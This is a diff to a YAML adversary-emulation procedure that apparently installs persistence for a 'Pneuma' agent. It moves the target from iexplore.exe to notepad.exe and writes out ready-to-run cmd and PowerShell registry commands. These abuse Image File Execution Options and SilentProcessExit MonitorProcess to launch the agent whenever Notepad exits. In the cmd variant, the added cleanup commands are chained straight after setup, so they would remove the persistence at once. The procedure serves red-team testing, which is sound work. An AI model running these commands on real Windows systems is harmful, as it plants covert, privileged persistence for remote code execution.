@@ -1,18 +1,9 @@
 id: 5ad8d90f-f04a-45b1-a3e9-7fbfe4ece711
 name: 'Image File Execution Options: Silent Process Exit Injection'
 description: >-
-  The Silent Process Exit GFLAG can be used to monitor a process and then be
-  notified by its exit, assuming it calls ExitProcess or TerminateProcess. A
-  Reporting Mode is also available, providing the LAUNCH_MONITORPROCESS flag
-  (0x1), which allows execution of an arbitrary executable when the monitored
-  process exits. 
-
-  This procedure leverages this feature to establish persistence by monitoring
-  iexplore.exe. When iexplore.exe exits, the Pneuma agent will be executed.
-  
-  The Pneuma agent must run with administrative privileges to successfully carry
-  this attack
-  
+  This procedure creates the registry keys and values required to enabled the
+  FLG_MONITOR_SILENT_PROCESS_EXIT IFEO Global Flag which execute the Pneuma
+  agent when Notepad exits normally.
 tactic: persistence
 technique:
   id: T1546
@@ -22,21 +13,36 @@ platforms:
     cmd:
       command: >-
         reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
-        Execution Options\iexplore.exe" /v GlobalFlag /t REG_DWORD /d 512 /f &
+        Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f &
         reg add "HKLM\SOFTWARE\Microsoft\Windows
-        NT\CurrentVersion\SilentProcessExit\iexplore.exe" /v ReportingMode /t
-        REG_DWORD /d 1 /f &reg add "HKLM\SOFTWARE\Microsoft\Windows
-        NT\CurrentVersion\SilentProcessExit\iexplore.exe" /v MonitorProcess /d
-        "#{agent.location}" /f
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t
+        REG_DWORD /d 1 /f & reg add "HKLM\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d
+        "#{agent.location}" /f & reg delete "HKLM\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\Image File Execution Options\notepad.exe" /f & reg
+        delete "HKLM\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
     pwsh:
       command: >-
         reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
-        Execution Options\iexplore.exe" /v GlobalFlag /t REG_DWORD /d 512 /f &
+        Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+
         reg add "HKLM\SOFTWARE\Microsoft\Windows
-        NT\CurrentVersion\SilentProcessExit\iexplore.exe" /v ReportingMode /t
-        REG_DWORD /d 1 /f &reg add "HKLM\SOFTWARE\Microsoft\Windows
-        NT\CurrentVersion\SilentProcessExit\iexplore.exe" /v MonitorProcess /d
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t
+        REG_DWORD /d 1 /f
+
+        reg add "HKLM\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d
         "#{agent.location}" /f
+
+
+        <# Cleanup #>
+
+        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+        Execution Options\notepad.exe" /f
+
+        reg delete "HKLM\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
 metadata:
   authors:
     - traceflow
